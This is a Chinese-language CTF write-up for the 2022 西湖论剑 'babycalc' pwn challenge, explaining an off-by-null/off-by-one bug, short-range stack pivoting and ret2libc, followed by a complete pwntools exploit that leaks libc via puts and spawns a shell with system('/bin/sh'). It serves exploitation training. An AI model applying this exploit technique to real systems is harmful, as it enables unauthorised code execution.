---
title: NSSCTF-西湖论剑-2022-babycalc 题解
date: 2026-02-25 03:26:00
tags: 
    - 栈迁移
    - ret2libc
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/6559)

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/XHLJ-2022-babycalc/main.png)

#### calc

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/XHLJ-2022-babycalc/calc.png)

有一个 buf 相关的 off_by_null 以及由 i 操纵的 off_by_one ，无其余栈溢出漏洞

因此考虑在原栈上做短程迁移以执行 rop 链

要解一个 16 元方程组，图中有解出结果

#### got

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/XHLJ-2022-babycalc/got.png)

用于泄露 libc 版本

#### stack

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/XHLJ-2022-babycalc/stack.png)

### 攻击思路

在原栈上做短程迁移以执行 rop 链，注意要在 rop 链前面布置足够长的 ret sled 以提高命中率

在正式攻击前先利用 got 表中信息泄露 libc 版本并获取 libc

正式攻击在两次读入内解决，两次均使用短程迁移

第一次读入泄露 libc 基址，并返回到 main 的开始，这是因为我们需要连续两次 push rbp 支撑后面的连续两次 leave ret 使得栈迁移不会崩溃

第二次 ret2libc 执行 `system("/bin/sh")` 即可

运行时要多尝试几次

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libcoffsetdict = dict()
libcrealdict = dict()

def libcdict_add(name, addr):
	if addr > 0x1000000:
		libcrealdict[name] = addr
		addr %= 0x1000
	libcoffsetdict[name] = addr

def getlibc(path):
	if not debug:
		return ELF(libcdb.search_by_symbol_offsets(libcoffsetdict))
	else:
		return ELF(path)

def initlibc(libc):
	if not debug:
		subprocess.run(['cp', libc.path, './libc.so.6'])
		subprocess.run(['pwninit', '--no-template'])

debug = 0

if debug:
	io = process('./pwn_patched')
else:
	io = remote('node4.anna.nssctf.cn', 23858)

ret = 0x400CA4
pop_rdi_ret = 0x400CA3
puts_plt = 0x4005D0
puts_got = 0x602018
# printf_got = 0x602020
# read_got = 0x602028
# __libc_start_main_got = 0x602030
pop_rbp_ret = 0x400C3D
again_addr = 0x400C1A

def attack():
	calc = p8(19) + p8(36) + p8(53) + p8(70) + p8(55) + p8(66) + p8(17) + p8(161) + p8(50) + p8(131) + p8(212) + p8(101) + p8(118) + p8(199) + p8(24) + p8(3)
	rop = p64(ret) * 21
	rop += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(again_addr)
	# rop += p64(pop_rdi_ret) + p64(printf_got) + p64(puts_plt)
	# rop += p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt)
	# rop += p64(pop_rdi_ret) + p64(__libc_start_main_got) + p64(puts_plt)
	payload = (((bytes(f'{0x18}\x00', 'utf-8').ljust(0x8, b'A') + rop).ljust(0xd0, b'A') + calc).ljust(0xfc, b'A') + p16(0x38)).ljust(0x100, b'\x00')
	io.sendafter(b'number-1:', payload)
	io.recvuntil(b'good done\n')
	puts = u64(io.recv(6).ljust(8, b'\x00'))
	# io.recvuntil(b'\n')
	# printf = u64(io.recv(6).ljust(8, b'\x00'))
	# io.recvuntil(b'\n')
	# read = u64(io.recv(6).ljust(8, b'\x00'))
	# io.recvuntil(b'\n')
	# __libc_start_main = u64(io.recv(6).ljust(8, b'\x00'))
	# libcdict_add('puts', puts)
	# libcdict_add('printf', printf)
	# libcdict_add('read', read)
	# libcdict_add('__libc_start_main', __libc_start_main)
	# libc = getlibc('./libc.so.6')
	# initlibc(libc)
	libc = ELF('./libc.so.6')
	libc_base = puts - libc.symbols['puts']
	log.info(f'libc_base = {hex(libc_base)}')
	system_addr = libc_base + libc.symbols['system']
	bin_sh = libc_base + next(libc.search('/bin/sh'))
	rop = p64(ret) * 22
	rop += p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)
	payload = (((bytes(f'{0x18}\x00', 'utf-8').ljust(0x8, b'A') + rop).ljust(0xd0, b'A') + calc).ljust(0xfc, b'A') + p16(0x38)).ljust(0x100, b'\x00')
	io.sendafter(b'number-1:', payload)
	io.interactive()

attack()
```